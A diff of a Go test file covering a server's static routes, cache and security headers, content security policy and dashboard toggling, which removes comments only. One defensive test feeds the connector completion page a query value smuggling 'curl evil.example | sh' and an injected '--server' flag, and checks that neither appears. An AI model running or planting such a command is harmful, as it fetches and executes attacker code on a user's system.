@@ -103,7 +103,6 @@ func TestSetupStaticFiles_Favicon(t *testing.T) {
 		t.Fatalf("Test request failed: %v", err)
 	}
 
-	// Favicon may or may not exist in stub embed; check it doesn't panic
 	if resp.StatusCode != http.StatusOK && resp.StatusCode != http.StatusNotFound {
 		t.Errorf("StatusCode = %d, want 200 or 404", resp.StatusCode)
 	}
@@ -136,7 +135,6 @@ func TestSetupStaticFiles_Assets(t *testing.T) {
 				t.Fatalf("Test request failed: %v", err)
 			}
 
-			// Assets may not exist in test embed, but the route handler should respond
 			if resp.StatusCode != http.StatusOK && resp.StatusCode != http.StatusNotFound {
 				t.Errorf("StatusCode = %d, want 200 or 404", resp.StatusCode)
 			}
@@ -152,7 +150,6 @@ func TestSetupStaticFiles_DoesNotInterfereWithAPI(t *testing.T) {
 
 	server := NewServer(fakeClient, nil, ServerConfig{Port: 8080, DashboardEnabled: true})
 
-	// Health endpoints should still work
 	req := httptest.NewRequest(http.MethodGet, "/healthz", nil)
 	resp, err := server.app.Test(req)
 	if err != nil {
@@ -162,7 +159,6 @@ func TestSetupStaticFiles_DoesNotInterfereWithAPI(t *testing.T) {
 		t.Errorf("healthz StatusCode = %d, want %d", resp.StatusCode, http.StatusOK)
 	}
 
-	// API endpoints should still require auth
 	req = httptest.NewRequest(http.MethodGet, "/api/v1/tasks", nil)
 	resp, err = server.app.Test(req)
 	if err != nil {
@@ -192,7 +188,6 @@ func TestSetupStaticFiles_IndexContent(t *testing.T) {
 		t.Fatalf("Failed to read body: %v", err)
 	}
 
-	// The embedded stub has content (at least "x\n")
 	if len(body) == 0 {
 		t.Error("expected non-empty body for index.html")
 	}
@@ -207,8 +202,6 @@ func TestSPAContentSecurityPolicyHashesInlineScripts(t *testing.T) {
 
 	csp := spaContentSecurityPolicy([]byte(html))
 
-	// The browser hashes the inline text after normalizing CRLF to LF; the
-	// external module script is covered by 'self' and gets no hash.
 	sum := sha256.Sum256([]byte(inline))
 	wantHash := "'sha256-" + base64.StdEncoding.EncodeToString(sum[:]) + "'"
 	if want := "script-src 'self' " + wantHash + ";"; !strings.Contains(csp, want) {
@@ -232,8 +225,6 @@ func TestSPAContentSecurityPolicyHashesInlineScripts(t *testing.T) {
 	}
 }
 
-// newStaticTestServer serves distFS through the production static routes and
-// error handler, with one large API response to prove compression is scoped.
 func newStaticTestServer(t *testing.T, distFS fstest.MapFS) *Server {
 	t.Helper()
 	index, ok := newSPAIndexPage(distFS)
@@ -316,8 +307,6 @@ func TestStaticFiles_CacheAndSecurityHeaders(t *testing.T) {
 }
 
 func TestStaticFiles_MissingAssetIsNotFound(t *testing.T) {
-	// A stale chunk reference must fail as a 404, not parse index.html as
-	// JavaScript; real UI routes keep the SPA fallback.
 	for _, path := range []string{"/assets/index-stale.js", "/assets/nested/index-abc.js", "/assets"} {
 		t.Run(path, func(t *testing.T) {
 			resp, err := newStaticTestServer(t, staticTestFS()).app.Test(httptest.NewRequest(http.MethodGet, path, nil))
@@ -340,9 +329,6 @@ func TestStaticFiles_MissingAssetIsNotFound(t *testing.T) {
 	}
 }
 
-// TestStaticFiles_EveryUIRouteIsRegistered derives the dashboard's top-level
-// routes from ui/src/routes and checks each is a registered, compressed route
-// rather than the error handler's uncompressed fallback.
 func TestStaticFiles_EveryUIRouteIsRegistered(t *testing.T) {
 	entries, err := os.ReadDir(filepath.Join("..", "..", "ui", "src", "routes"))
 	if err != nil {
@@ -453,9 +439,6 @@ func TestSetupStaticFiles_EmbeddedFallbackHeaders(t *testing.T) {
 	_ = corev1.AddToScheme(scheme)
 	server := NewServer(fake.NewClientBuilder().WithScheme(scheme).Build(), nil, ServerConfig{Port: 8080, DashboardEnabled: true})
 
-	// An unknown path has no registered route and is served by the error
-	// handler's SPA fallback; it carries the same document headers as a
-	// registered route.
 	for _, path := range []string{"/", "/no-such-page"} {
 		resp, err := server.app.Test(httptest.NewRequest(http.MethodGet, path, nil))
 		if err != nil {
@@ -484,8 +467,6 @@ func TestSetupStaticFiles_EmbeddedFallbackHeaders(t *testing.T) {
 	}
 }
 
-// newConfiguredTestServer builds the production server from config, so the
-// dashboard flag decides which static routes exist.
 func newConfiguredTestServer(t *testing.T, config ServerConfig) *Server {
 	t.Helper()
 	scheme := runtime.NewScheme()
@@ -498,8 +479,6 @@ func newConfiguredTestServer(t *testing.T, config ServerConfig) *Server {
 func TestSetupStaticFiles_DashboardDisabledByDefault(t *testing.T) {
 	server := newConfiguredTestServer(t, ServerConfig{})
 
-	// Without the dashboard, its routes and the SPA fallback are gone: every
-	// unrouted path is a JSON 404, the same answer the API paths give.
 	for _, path := range []string{"/", "/login", "/tasks", "/settings/connectors", "/some-ui-route", "/assets/main.js", "/favicon.svg"} {
 		t.Run(path, func(t *testing.T) {
 			resp, err := server.app.Test(httptest.NewRequest(http.MethodGet, path, nil))
@@ -571,9 +550,6 @@ func TestConnectorCompletionPage_WithoutDashboard(t *testing.T) {
 func TestConnectorCompletionPage_ShowsOnlyValidatedQueryValues(t *testing.T) {
 	server := newConfiguredTestServer(t, ServerConfig{Connectors: ConnectorConfig{Enabled: true}})
 
-	// Anyone can send a person this URL, so a query value that is not a
-	// Kubernetes name or a reason code must not become part of the command
-	// the page tells them to run.
 	_, body := getConnectorCompletionPage(t, server, connectorSettingsPath+
 		"?status=pending&connection=x%3B%20curl%20evil.example%20%7C%20sh&namespace=a%20--server%20https://evil.example")
 	if strings.Contains(body, "evil.example") {
